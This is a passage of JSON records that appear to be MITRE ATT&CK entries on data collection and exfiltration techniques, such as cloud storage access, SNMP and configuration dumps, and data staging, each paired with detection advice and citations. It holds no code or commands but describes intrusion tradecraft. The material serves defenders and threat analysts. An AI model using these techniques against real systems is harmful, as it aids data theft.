MESSAGETAP October 2019),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET Crutch December 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET Carbon Mar 2017),(Citation: Talos Oblique RAT March 2021),(Citation: PWC Cloud Hopper April 2017),(Citation: CISA EB Aug 2020),(Citation: Kroll Qakbot June 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: aptsim),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: ESET TeleBots Oct 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta Blockbuster Loaders),(Citation: Symantec Darkmoon Aug 2005),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Sednit USBStealer 2014),(Citation: Novetta Blockbuster),(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye FIN6 April 2016),(Citation: Cofense Astaroth Sept 2018),(Citation: Symantec W32.Duqu),(Citation: ESET Attor Oct 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Cylance Dust Storm),(Citation: FireEye Periscope March 2018),(Citation: Securelist Dtrack),(Citation: Cylance Machete Mar 2017),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cybereason Kimsuky November 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: ESET LightNeuron May 2019),(Citation: ESET InvisiMole June 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: US-CERT TA18-074A),(Citation: Kaspersky MoleRATs April 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET Operation Groundbait),(Citation: Mandiant APT41),(Citation: Objective-See MacMa Nov 2021),(Citation: Palo Alto OilRig May 2016),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),"}
{"ID":"T1074.002","name":"Data Staged: Remote Data Staging","description":"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.","url":"https://attack.mitre.org/techniques/T1074/002","created":"13 March 2020","last modified":"08 March 2021","version":"1.1","tactics":"Collection","detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"IaaS, Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, File: File Creation","is sub-technique":true,"sub-technique of":"T1074","defenses bypassed":null,"contributors":"Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: FireEye FIN6 April 2016),(Citation: NCC Group Chimera January 2021),(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: PWC Cloud Hopper April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Symantec Cicada November 2020),(Citation: McAfee Night Dragon),"}
{"ID":"T1030","name":"Data Transfer Size Limits","description":"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.","url":"https://attack.mitre.org/techniques/T1030","created":"31 May 2017","last modified":"14 July 2020","version":"1.0","tactics":"Exfiltration","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: cobaltstrike manual),(Citation: Kaspersky Lyceum October 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: KISA Operation Muzabi),(Citation: Palo Alto OilRig May 2016),(Citation: ESET ForSSHe December 2018),(Citation: FireEye POSHSPY April 2017),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Mythc Documentation),(Citation: FireEye CARBANAK June 2017),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Unit42 RDAT July 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Rclone),(Citation: Dell TG-3390),"}
{"ID":"T1530","name":"Data from Cloud Storage","description":"Adversaries may access data from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. \n\nIn other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.(Citation: EA Hacked via Slack - June 2021)(Citation: SecureWorld - How Secure Is Your Slack Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April 2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)\n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.","url":"https://attack.mitre.org/techniques/T1530","created":"30 August 2019","last modified":"18 October 2022","version":"2.0","tactics":"Collection","detection":"Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.","platforms":"IaaS, SaaS","data sources":"Cloud Storage: Cloud Storage Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"AppOmni; Netskope; Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Peirates GitHub),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Amazon  AWS Temporary Security Credentials),(Citation: Amazon S3 Security, 2019),(Citation: Microsoft Azure Storage Security, 2019),(Citation: Google Cloud Encryption Key Rotation)"}
{"ID":"T1602","name":"Data from Configuration Repository","description":"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)","url":"https://attack.mitre.org/techniques/T1602","created":"19 October 2020","last modified":"19 April 2022","version":"1.0","tactics":"Collection","detection":"Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)","platforms":"Network","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: US-CERT-TA18-106A),(Citation: Cisco Securing SNMP),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Blog Legacy Device Attacks)"}
{"ID":"T1602.002","name":"Data from Configuration Repository: Network Device Configuration Dump","description":"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ","url":"https://attack.mitre.org/techniques/T1602/002","created":"20 October 2020","last modified":"17 February 2022","version":"1.0","tactics":"Collection","detection":"Identify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration.(Citation: US-CERT TA18-068A 2018)","platforms":"Network","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1602","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018),(Citation: Cisco Securing SNMP),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Blog Legacy Device Attacks)"}
{"ID":"T1602.001","name":"Data from Configuration Repository: SNMP (MIB Dump)","description":"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ","url":"https://attack.mitre.org/techniques/T1602/001","created":"19 October 2020","last modified":"22 October 2020","version":"1.0","tactics":"Collection","detection":"Identify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)","platforms":"Network","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1602","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: US-CERT-TA18-106A),(Citation: Cisco Securing SNMP),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Blog Legacy Device Attacks)"}
{"ID":"T1213","name":"Data from Information Repositories","description":"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.","url":"https://attack.mitre.org/techniques/T1213","created":"18 April 2018","last modified":"11 April 2022","version":"3.2","tactics":"Collection","detection":"As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) Sharepoint audit logging can also be configured to report when a user shares a resource. (Citation: Sharepoint Sharing Events) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities. ","platforms":"Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Isif Ibrahima, Mandiant; Milos Stojadinovic; Naveen Vijayaraghavan, Nilesh Dherange (Gurucul); Praetorian; Regina Elwell","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ANSSI Sandworm January 2021),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Visa FIN6 Feb 2019),(Citation: ESET ComRAT May 2020),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1213.003","name":"Data from Information Repositories: Code Repositories","description":"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)\n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.","url":"https://attack.mitre.org/techniques/T1213/003","created":"11 May 2021","last modified":"18 October 2022","version":"1.1","tactics":"Collection","detection":"Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.","platforms":"SaaS","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Creation","is sub-technique":true,"sub-technique of":"T1213","defenses bypassed":null,"contributors":"Itamar Mizrahi, Cymptom; Josh Liburdi, @jshlbrd; Toby Kohlenberg","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft Internal Solorigate Investigation Blog),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1213.001","name":"Data from Information Repositories: Confluence","description":"\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n","url":"https://attack.mitre.org/techniques/T1213/001","created":"14 February 2020","last modified":"08 June 2021","version":"1.0","tactics":"Collection","detection":"Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nUser access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.","platforms":"SaaS","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Creation","is sub-technique":true,"sub-technique of":"T1213","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1213.002","name":"Data from Information Repositories: Sharepoint","description":"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n","url":"https://attack.mitre.org/techniques/T1213/002","created":"14 February 2020","last modified":"08 June 2021","version":"1.0","tactics":"Collection","detection":"The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. \n\n","platforms":"Office 365, Windows","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Creation","is sub-technique":true,"sub-technique of":"T1213","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: RSAC 2015 Abu Dhabi Stefano Maccaglia),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1005","name":"Data from Local System","description":"Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n","url":"https://attack.mitre.org/techniques/T1005","created":"31 May 2017","last modified":"12 April 2023","version":"1.6","tactics":"Collection","detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to collect files such as configuration files with built-in features native to the network device platform.(Citation: Mandiant APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands that view configuration files. ","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; William Cain","permissions required":null,"supports remote":null,"system requirements":"Privileges to access certain files and directories","impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Mandiant APT1),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Wevtutil Microsoft Documentation),(Citation: FoxIT Wocao December 2019),(Citation: Novetta Blockbuster RATs),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: SecureWorks August 2019),(Citation: Korean FSI TA505 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: RiskIQ British Airways September 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: S2 Grupo TrickBot June 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: ESET Nomadic Octopus 2018),(Citation: Fidelis njRAT June 2013),(Citation: NCSC Cyclops Blink February 2022),(Citation: McAfee Lazarus Jul 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: ANSSI Sandworm January 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: NCSC Joint Report Public Tools),(Citation: Github Koadic),(Citation: FireEye APT37 Feb 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Unit 42 PingPull Jun 2022),(Citation: McAfee Night Dragon),(Citation: Microsoft Actinium February 2022),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: KISA Operation Muzabi),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: Profero APT27 December 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Talos Bisonal Mar 2020),(Citation: Group IB GrimAgent July 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Cybereason PowerLess February 2022),(Citation: Symantec Hydraq Jan 2010),(Citation: Securelist Calisto July 2018),(Citation: ClearSky Siamesekitten August 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Check Point APT34 April 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Microsoft POLONIUM June 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Forcepoint Monsoon),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT30),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Palo Alto Rover),(Citation: Trend Micro FIN6 October 2019),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: GitHub PowerSploit May 2012),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: PWC WellMess July 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Symantec Chafer February 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Symantec Pasam May 2012),(Citation: Kroll RawPOS Jan 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: FBI FLASH APT39 September 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Talos TinyTurla September 2021),(Citation: ESET Crutch December 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Lee 2013),(Citation: ESET Dukes October 2019),(Citation: Volexity SolarWinds),(Citation: NSA/FBI Drovorub August 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Pawn Storm 2019),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Malwarebytes Konni Aug 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: aptsim),(Citation: McAfee Sharpshooter December 2018),(Citation: Red Canary 2021 Threat Detection Report March 2021),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Novetta Blockbuster Loaders),(Citation: Kaspersky APT Trends Q1 2020),(Citation: TrendMicro Taidoor),(Citation: Symantec Darkmoon Aug 2005),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Unit42 CookieMiner Jan 2019),(Citation: FireEye Fin8 May 2016),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: F-Secure Lazarus Cryptocurrency Aug 2020),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: ESET ForSSHe December 2018),(Citation: Talos ZxShell Oct 2014),(Citation: CheckPoint Bandook Nov 2020),(Citation: Accenture MUDCARP March 2019),(Citation: Secureworks MCMD July 2019),(Citation: ASERT Donot March 2018),(Citation: DFIR Phosphorus November 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: RiskIQ Newegg September 2018),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Cylance Dust Storm),(Citation: FireEye Periscope March 2018),(Citation: F-Secure Cosmicduke),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: DOJ APT10 Dec 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: Red Canary Qbot),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Überwachung APT28 Forfiles June 2015),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Talos GravityRAT),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: CISA WellMail July 2020),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: trendmicro xcsset xcode project 2020),(Citation: Symantec Cicada November 2020),(Citation: Novetta-Axiom),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: PaloAlto Patchwork Mar 2018),(Citation: McAfee Bankshot),(Citation: Symantec Linfo May 2012),(Citation: Kaspersky QakBot September 2021),(Citation: TrendMicro RawPOS April 2015),(Citation: Microsoft GALLIUM December 2019),(Citation: US-CERT TA18-074A),(Citation: CISA WellMess July 2020),(Citation: Cybereason Bazar July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: PowerSploit Documentation),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Talos Frankenstein June 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: F-Secure The Dukes),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: Securelist Kimsuky Sept 2013),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Cymmetria Patchwork),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: McAfee GhostSecret),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
